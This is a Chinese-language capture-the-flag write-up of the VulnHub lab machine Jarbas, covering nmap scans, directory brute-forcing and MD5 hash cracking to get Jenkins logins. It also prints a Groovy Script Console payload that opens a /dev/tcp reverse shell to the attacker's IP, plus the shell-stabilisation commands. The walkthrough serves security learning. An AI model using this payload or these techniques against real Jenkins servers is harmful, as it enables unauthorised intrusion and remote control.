---
title: vulnhub-JARBAS通关
date: 2023-06-10 10:00:24
tags:
  - vulnhub
  - jarbas
  - WriteUp
categories: WriteUp
description: 本文记录了作者在通关vulnhub靶机JARBAS中遇到的问题，通过目录爆破发现 Jenkins 后台登录界面，并爆破密码获取登录凭据，通过 pipline ACL 漏洞写入反弹shell获取立足点。
top_img: https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg
cover: https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg
---
## 靶机详情

靶机地址：192.168.118.135

>If you want to keep your hacking studies, please try out this machine!
Jarbas 1.0 – A tribute to a nostalgic Brazilian search engine in the end of 90’s.
Objective: Get root shell!
## 信息搜集

按照常规的方法：通过 TCP | UDP 扫描端口、获取开放端口对应信息、系统版本信息

下面是通过 TCP 扫描发现所收集到的信息：

```
$ sudo nmap -sT -p- --min-rate 10000 192.168.118.135 -oN nmapscan/portscan.txt    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 23:24 EDT
Nmap scan report for 192.168.118.135
Host is up (0.0013s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 00:0C:29:4C:CC:C8 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 3.52 seconds

$ sudo nmap -sT -Pn -sCV -O -p22,80,3306,8080 --min-rate 10000 192.168.118.135 -oN nmapscan/servscan.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 23:30 EDT
Nmap scan report for 192.168.118.135
Host is up (0.00065s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 28bc493c6c4329573cb8859a6d3c163f (RSA)
|   256 a01b902cda79eb8f3b14debb3fd2e73f (ECDSA)
|_  256 57720854b756ffc3e6166f97cfae7f76 (ED25519)
80/tcp   closed http
3306/tcp open   mysql      MariaDB (unauthorized)
8080/tcp closed http-proxy
MAC Address: 00:0C:29:4C:CC:C8 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.54 seconds

$ sudo nmap -sU -Pn -p- --min-rate 10000 192.168.118.135 -oN nmapscan/udpscan.txt                                                          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 23:31 EDT
Warning: 192.168.118.135 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.118.135
Host is up (0.0014s latency).
Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT      STATE SERVICE
33848/udp open  unknown
MAC Address: 00:0C:29:4C:CC:C8 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 72.82 seconds
```

根据提供的 nmap 扫描结果，靶机（192.168.118.135）开放了以下服务和端口：SSH（22/tcp），HTTP（80/tcp），MySQL（3306/tcp），和 HTTP 代理（8080/tcp）。同时靶机系统版本可能是 Linux 3.X 或 4.X 。最后，UDP 扫描结果显示存在一个在33848端口开放的未知 UDP 服务。

### 攻击面分析

根据扫描信息，当前可以从下列几个方向进行攻击：

1. 网页：前台80端口和后台8080端口
2. 数据库：MySQL3306端口
3. UDP服务：33848端口
### Web 服务扫描

接下来使用 `dirsearch` 扫描一下 80 端口的 Web 服务存在哪些目录。

```
$ dirsearch -u http://192.168.118.135

[23:32:55] 200 -  359B  - /access.html
[23:33:11] 200 -   32KB - /index.html
Task Completed 
```

依次访问扫描结果，未发现可以利用的地方，然后按照常规渗透测试思路，访问 `robots.txt` 。

```
# we don't want robots to click "build" links
User-agent: *
Disallow: /
```

发现作者的提示：“we don't want robots to click "build" links .” 但目前仍然没有可以利用的地方。

## 获取立足点

### hash爆破后台凭据

继续寻找新的突破口，访问8080端口的后台页面。发现存在三个明显是 hash 值的用户名与密码。使用 `hash-identifier` 识别加密，猜测是 MD5 加密，因此再使用 `jhon` 破解加密，最终得到结果

```
$ hash-identifier 5978a63b4654c73c60fa24f836386d87    

Possible Hashs:                                         
[+] MD5                                                 
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) 
```

```
$ cat user_passwd.txt 
tiago:italia99
trindade:marianna
eder:vipsu
```

~~因为前两个登录8080端口后台都失败了，我以为这条路又走不通。在兜兜转转徘徊了半小时之后，又回来尝试这个攻击向量，才发现自己的失误。~~

### 发现服务框架 Jenkins

登录之后，浏览后台管理界面，发现存在一个“Build History”的页面，仔细观察后，发现url链接的尾部就是"build"，这难免就让人想到之前 `robots` 中给出的提示，因此针对性分析一下这个板块。

![pic1](https://pic.imgdb.cn/item/653b5cbcc458853aef1cfab2.jpg)

然后当我后知后觉的去查询CMS的时候，才发现这是 Jenkins 系统<sup>[①](#Jenkins-介绍)</sup>，翻看 Jenkins 文档后尝试使用 Jenkins Pipeline 写入后门。

### CI/CD 工具反弹Shell

查询资料之后了解到 Jenkins 是通过 Groovy 语言<sup>[②](#Groovy-语言)</sup>来执行 pipeline 的。同时再翻看系统设置之后，发现了 Script Console 模块，根据以往的渗透经验和直觉，我猜测此处应该可以反弹shell。但是因为现学 Groovy 语言需要学习成本，我就暂时搁置这个工具向量，去寻找有没有现成的脚本利用。


![Script Console](https://pic.imgdb.cn/item/6540e286c458853aefd08a36.jpg)

随后又使用 Searchsploit 搜索了一下 Jenkins 漏洞，发现该版本确实存在 ACL 漏洞，但是直接使用 MSF 脚本却没打进去，大概是因为靶机 Jenkins 服务运行在8080端口，未成功设置 `RHOST` 和 `Target` 。

于是回头继续研究 Groovy 语言，最终根据其语法构造了下面的脚本在 Script Console 反弹shell：

``` groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.213.129/10234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

![Reverse Shell](https://pic.imgdb.cn/item/6540e209c458853aefcf3345.jpg)


反弹shell成功获取jenkins账号权限，之后顺手提升一下终端稳定性，方便之后提权。

```
$ rlwrap nc -lvnp 10234
listening on [any] 10234 ...
connect to [192.168.213.129] from (UNKNOWN) [192.168.213.132] 46900
/bin/bash -i
bash: no job control in this shell
bash-4.2$ ps -p $$
ps -p $$
   PID TTY          TIME CMD
  1701 ?        00:00:00 bash
bash-4.2$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.2$ export TERM=xterm
export TERM=xterm
bash-4.2$ stty raw -echo
stty raw -echo
bash-4.2$ whoami
jenkins
bash-4.2$
```

## 总结

Jarbas 靶机对于我来说稍微有点难度，主要在于：

1. 爆破密码时即使有提示，却在前两个凭据未成功时放弃尝试，未能坚持继续深入，浪费了时间；
2. Jenkins 这种 CI&CD 软件我了解不多，学习 Groovy 语法，调试反弹shell的时候耽搁了不少时间；

不过这个靶机也给我带来了不少收获，尤其是对于渗透测试时如何根据渗透经验来选择攻击向量，有了更深的心得体会，也总算能够体会到渗透时灵光一现的直觉判断了，这给了我极大的鼓励和欣喜。
## 注释

### Jenkins 介绍

[Jenkins](https://www.jenkins.io/zh/doc/) 是一款开源 CI&CD 软件，用于自动化各种任务，包括构建、测试和部署软件。Jenkins 支持各种运行方式，可通过系统包、Docker 或者通过一个独立的 Java 程序。

![jenkins](https://pic.imgdb.cn/item/653b7dd8c458853aef8a589b.jpg)

Jenkins 的主要功能包括：

1. **持续集成**：Jenkins 可以在代码库中的每次提交或定期计划的基础上触发自动化构建，确保应用程序代码的集成和构建是可靠的。

2. **自动化构建和测试**：Jenkins 可以构建应用程序代码，运行单元测试、集成测试和其他自动化测试，以确保软件质量。

3. **部署**：它支持自动化部署到不同的目标环境，如开发、测试和生产服务器。

4. **插件生态系统**：Jenkins 提供了一个庞大的插件生态系统，允许用户扩展其功能。用户可以轻松地集成各种构建工具、版本控制系统、测试框架和其他工具。

5. **分布式构建**：Jenkins 支持在多台计算机上并行运行构建任务，以加速构建过程。

6. **监控和报告**：它生成构建和测试的报告，并提供了可视化工具来监控构建任务的状态。

7. **可配置性**：Jenkins 允许用户通过Web界面配置构建任务，无需编写复杂的脚本。

8. **安全性**：Jenkins 具有用户身份验证和授权机制，可以管理用户对不同任务的访问权限。

Jenkins 通常用于敏捷开发环境中，以实现持续集成和持续交付 (CI/CD) 目标，帮助开发团队更快地构建、测试和部署软件，同时提高软件质量。它是一个强大的工具，广泛用于开发和 DevOps 团队中。

### Groovy 语言

Groovy 是一种基于 Java 平台的编程语言，设计初衷是为了提供更简洁、易读、易写的代码语法，并且与 Java 紧密集成。Groovy 语言不仅继承了 Java 的特性，还引入了一些动态语言的概念，如脚本语言和动态类型。以下是 Groovy 语言的一些特点和用途：

1. **Java 集成**：Groovy 可以无缝与 Java 代码互操作，可以直接使用 Java 类库，也可以将 Groovy 代码编译成 Java 字节码并在 Java 虚拟机上运行。

2. **动态类型**：Groovy 支持动态类型，不需要显式声明变量的类型。这使得代码编写更加灵活。

3. **简洁的语法**：Groovy 提供了更简洁的语法，相对于 Java 更易读、更少样板代码。它支持闭包、更简洁的方法声明、动态属性等功能。

4. **脚本语言特性**：Groovy 可以作为脚本语言使用，可以执行脚本而无需编译。这对于快速原型开发和自动化脚本编写非常有用。

5. **元编程**：Groovy 支持元编程，可以在运行时修改类和对象的结构。这在某些情况下非常有用，比如在框架开发中。

6. **领域特定语言（DSL）支持**：Groovy 可用于创建领域特定语言，这些 DSL 可以更好地描述特定问题领域的问题。这在配置文件和测试中非常有用。

7. **良好的集成工具**：Groovy 可以与多种集成开发环境（IDE）和构建工具（如 Gradle）一起使用。

8. **大数据和脚本编程**：Groovy 在大数据领域和脚本编程中非常流行，特别是与 Apache Groovy 结合使用。

Groovy 是一种多用途的编程语言，可用于 Web 开发、脚本编写、自动化、测试、应用程序开发等各种领域。它的语法易学易用，尤其对于那些已经熟悉 Java 的开发人员而言，学习曲线相对较低。